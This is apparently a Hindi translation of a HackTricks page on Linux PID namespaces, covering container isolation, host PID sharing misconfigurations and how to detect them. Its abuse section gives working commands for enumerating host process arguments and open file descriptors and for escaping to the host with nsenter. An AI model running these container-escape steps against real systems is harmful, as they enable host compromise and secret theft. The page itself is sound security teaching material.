# PID नामस्थान

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

PID नामस्थान नियंत्रित करता है कि प्रक्रियाओं को कैसे नंबर दिया जाता है और कौन‑सी प्रक्रियाएँ दिखाई देती हैं। इसलिए एक कंटेनर अपना स्वयं का PID 1 रख सकता है भले ही वह असली मशीन न हो। नामस्थान के अंदर, वर्कलोड को ऐसा दिखाई देता है जैसे यह एक लोकल प्रोसेस ट्री हो। नामस्थान के बाहर, होस्ट फिर भी असली host PIDs और पूरा प्रोसेस परिदृश्य देखता रहता है।

सुरक्षा के दृष्टिकोण से PID नामस्थान इसलिए महत्वपूर्ण है क्योंकि प्रोसेस विजिबिलिटी कीमती होती है। एक बार जब कोई वर्कलोड होस्ट प्रक्रियाएँ देख सकता है, तो वह service names, command-line arguments, प्रोसेस आर्ग्युमेंट्स में पास किए गए secrets, `/proc` के माध्यम से environment-निर्मित state, और संभावित namespace-entry targets का अवलोकन कर सकता है। अगर वह केवल उन प्रक्रियाओं को देखने से आगे जाकर—उदाहरण के लिए signals भेजकर या उचित शर्तों में ptrace का उपयोग करके—कुछ और कर सके, तो समस्या काफी गंभीर बन सकती है।

## कार्यप्रणाली

एक नया PID नामस्थान अपनी आंतरिक प्रोसेस नंबरिंग के साथ शुरू होता है। इसके अंदर बनाई गई पहली प्रक्रिया नामस्थान की दृष्टि से PID 1 बन जाती है, जिसका मतलब यह भी है कि उसे orphaned children और signal व्यवहार के लिए विशेष init-जैसी semantics मिलती हैं। यह container के आसपास init processes, zombie reaping, और क्यों कभी-कभी छोटे init wrappers का उपयोग किया जाता है—इन कई अजीबताओं को समझाता है।

महत्वपूर्ण सुरक्षा सबक यह है कि एक प्रक्रिया अलग दिख सकती है क्योंकि वह केवल अपना PID ट्री ही देखती है, पर वह अलगाव जानबूझकर हटाया जा सकता है। Docker इसे `--pid=host` के माध्यम से एक्सपोज़ करता है, जबकि Kubernetes इसे `hostPID: true` के ज़रिये करता है। एक बार container host PID namespace में शामिल हो जाए, तो वर्कलोड सीधे host प्रक्रियाएँ देखता है, और कई बाद के आक्रमण मार्ग बहुत अधिक वास्तविक बन जाते हैं।

## लैब

PID नामस्थान मैन्युअली बनाने के लिए:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
शेल अब एक निजी प्रोसेस दृश्य देखता है। `--mount-proc` flag महत्वपूर्ण है क्योंकि यह procfs का एक instance माउंट करता है जो नए PID namespace से मेल खाता है, जिससे अंदर से प्रोसेस सूची संगत हो जाती है।

container व्यवहार की तुलना करने के लिए:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## रनटाइम उपयोग

Docker, Podman, containerd, और CRI-O में सामान्य कंटेनरों को अपना स्वयं का PID namespace मिलता है। Kubernetes Pods आमतौर पर भी एक अलग PID दृश्य प्राप्त करते हैं जब तक workload स्पष्ट रूप से host PID sharing की मांग न करे। LXC/Incus वातावरण उसी kernel primitive पर निर्भर करते हैं, हालांकि system-container उपयोग मामलों में अधिक जटिल process trees सामने आ सकते हैं और अधिक debugging शॉर्टकट को प्रोत्साहित कर सकते हैं।

समान नियम हर जगह लागू होता है: यदि runtime ने PID namespace को अलग करने का विकल्प नहीं चुना, तो वह container सीमा में जानबूझकर की गई कमी है।

## गलत कॉन्फ़िगरेशन

प्रमुख गलत कॉन्फ़िगरेशन host PID sharing है। टीमें अक्सर इसे debugging, monitoring, या service-management की सुविधा के लिए जायज़ ठहराती हैं, लेकिन इसे हमेशा एक महत्वपूर्ण सुरक्षा अपवाद के रूप में माना जाना चाहिए। भले ही कंटेनर के पास host प्रक्रियाओं पर कोई तात्कालिक write primitive न हो, केवल दृश्यता ही सिस्टम के बारे में बहुत कुछ उजागर कर सकती है। एक बार `CAP_SYS_PTRACE` जैसी capabilities या उपयोगी procfs एक्सेस जोड़ दिए जाएँ, तो जोखिम काफी बढ़ जाता है।

एक और गलती यह मान लेना है कि क्योंकि workload डिफ़ॉल्ट रूप से host प्रक्रियाओं को kill या ptrace नहीं कर सकता, इसलिए host PID sharing हानिरहित है। यह निष्कर्ष enumeration के मूल्य, namespace-entry लक्ष्यों की उपलब्धता, और PID दृश्यता के अन्य कमजोर नियंत्रणों के साथ मिलकर काम करने के तरीके को नज़रअंदाज़ करता है।

## दुरुपयोग

यदि host PID namespace साझा किया गया है, तो एक attacker host प्रक्रियाओं का निरीक्षण कर सकता है, process arguments एकत्र कर सकता है, दिलचस्प services की पहचान कर सकता है, `nsenter` के लिए candidate PIDs ढूँढ सकता है, या प्रक्रिया की दृश्यता को ptrace-संबंधित privileges के साथ जोड़कर host या पड़ोसी workloads में हस्तक्षेप कर सकता है। कुछ मामलों में, केवल सही लंबे समय तक चलने वाली प्रक्रिया को देखना ही बाकी हमला योजना को बदलने के लिए पर्याप्त होता है।

पहला व्यावहारिक कदम हमेशा यह सुनिश्चित करना होता है कि host प्रक्रियाएँ वाकई दिखाई दे रही हैं:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
एक बार host PIDs दिखाई देने लगें, process arguments और namespace-entry targets अक्सर सबसे उपयोगी सूचना स्रोत बन जाते हैं:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
यदि `nsenter` उपलब्ध है और पर्याप्त privilege मौजूद हैं, तो जाँच करें कि क्या कोई visible host process को namespace bridge के रूप में इस्तेमाल किया जा सकता है:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
भले ही प्रवेश ब्लॉक हो, होस्ट PID साझा करना पहले से ही उपयोगी होता है क्योंकि यह सेवा की व्यवस्था, रनटाइम घटकों, और अगली निशाना बनाने योग्य प्रिविलेज्ड प्रक्रियाओं का खुलासा करता है।

होस्ट PID की दृश्यता फ़ाइल-डिस्क्रिप्टर दुरुपयोग को भी अधिक यथार्थवादी बनाती है। यदि कोई प्रिविलेज्ड होस्ट प्रक्रिया या पड़ोसी वर्कलोड किसी संवेदनशील फ़ाइल या socket को खोल कर रखता है, तो हमलावर `/proc/<pid>/fd/` का निरीक्षण कर सकता है और ओनरशिप, procfs माउंट विकल्प, तथा लक्ष्य सेवा मॉडल के आधार पर उस हैंडल का पुन: उपयोग कर सकता है।
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
ये कमांड उपयोगी हैं क्योंकि वे यह बताते हैं कि `hidepid=1` या `hidepid=2` क्रॉस-प्रोसेस दृश्यता को घटा रहे हैं या नहीं, और क्या स्पष्ट रूप से दिलचस्प descriptors जैसे open secret files, logs, or Unix sockets बिल्कुल भी दिखाई दे रहे हैं।

### पूरा उदाहरण: host PID + `nsenter`

Host PID sharing तब सीधे host escape बन जाता है जब प्रोसेस के पास host namespaces में शामिल होने के लिए पर्याप्त privilege होता है:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
यदि कमांड सफल हो जाए, तो कंटेनर प्रक्रिया अब host mount, UTS, network, IPC, और PID namespaces में चल रही होती है। इसका प्रभाव तुरंत host compromise होता है।

यहाँ तक कि जब `nsenter` स्वयं मौजूद न हो, तब भी वही परिणाम host binary के जरिए प्राप्त किया जा सकता है अगर host filesystem mount की हुई हो:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### हाल के रनटाइम नोट्स

कुछ PID-namespace-संबंधी हमले पारंपरिक `hostPID: true` misconfigurations नहीं हैं, बल्कि कंटेनर सेटअप के दौरान procfs सुरक्षा लागू करने के तरीके के आसपास के रनटाइम कार्यान्वयन बग हैं।

#### `maskedPaths` का host procfs के लिए रेस

कमजोर `runc` वर्ज़न्स में, कंटेनर इमेज या `runc exec` वर्कलोड को नियंत्रित करने में सक्षम हमलावर masking चरण में रेस कर सकते हैं, container-side `/dev/null` को उस संवेदनशील procfs पाथ की ओर इशारा करने वाले symlink से बदलकर, जैसे `/proc/sys/kernel/core_pattern`। यदि रेस सफल हुआ, तो masked-path bind mount गलत टार्गेट पर लग सकती है और host-global procfs knobs को नए कंटेनर के लिए उजागर कर सकती है।

समीक्षा के लिए उपयोगी कमांड:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
यह महत्वपूर्ण है क्योंकि अंततः असर सीधे procfs एक्सपोज़र जैसा ही हो सकता है: writable `core_pattern` या `sysrq-trigger`, जिसके बाद host code execution या denial of service हो सकता है।

#### Namespace injection with `insject`

Namespace injection tools such as `insject` show that PID-namespace interaction does not always require pre-entering the target namespace before process creation. A helper can attach later, use `setns()`, and execute while preserving visibility into the target PID space:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
इस तरह की तकनीक मुख्य रूप से advanced debugging, offensive tooling, और post-exploitation workflows के लिए मायने रखती है, जहाँ namespace context को runtime द्वारा workload को initialize करने के बाद जोड़ा जाना होता है।

### संबंधित FD दुरुपयोग पैटर्न

जब host PIDs दिखाई देते हैं, तो विशेष रूप से दो पैटर्न को स्पष्ट रूप से बताना उपयोगी है। पहला, एक विशेषाधिकार प्राप्त प्रक्रिया संवेदनशील file descriptor को `execve()` के दौरान open रख सकती है क्योंकि उसे `O_CLOEXEC` के साथ marked नहीं किया गया था। दूसरा, services `SCM_RIGHTS` के माध्यम से Unix sockets पर file descriptors पास कर सकती हैं। दोनों मामलों में दिलचस्प वस्तु अब pathname नहीं, बल्कि पहले से-open handle है जिसे lower-privilege process विरासत में प्राप्त कर सकता है या प्राप्त कर सकता है।

यह container work में महत्वपूर्ण है क्योंकि handle `docker.sock`, एक privileged log, एक host secret file, या किसी अन्य उच्च-मूल्य वाली वस्तु की ओर संकेत कर सकता है भले ही path स्वयं container filesystem से सीधे पहुँच योग्य न हो।

## जांच

इन commands का उद्देश्य यह निर्धारित करना है कि प्रक्रिया के पास एक private PID view है या क्या वह पहले से ही कहीं अधिक व्यापक process landscape को enumerate कर सकती है।
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- अगर process सूची में स्पष्ट host services दिखाई देते हैं, तो host PID sharing संभवतः पहले से ही प्रभावी है।
- केवल एक छोटा container-local tree दिखना सामान्य बेसलाइन है; `systemd`, `dockerd`, या unrelated daemons दिखना सामान्य नहीं है।
- एक बार host PIDs दिखाई देने के बाद, यहां तक कि read-only process जानकारी भी उपयोगी reconnaissance बन जाती है।

यदि आप पाते हैं कि कोई container host PID sharing के साथ चल रहा है, तो इसे केवल cosmetic difference के रूप में न लें। यह workload के लिए जो कुछ observe कर सकता है और संभावित रूप से affect कर सकता है, उसमें एक बड़ा बदलाव है।
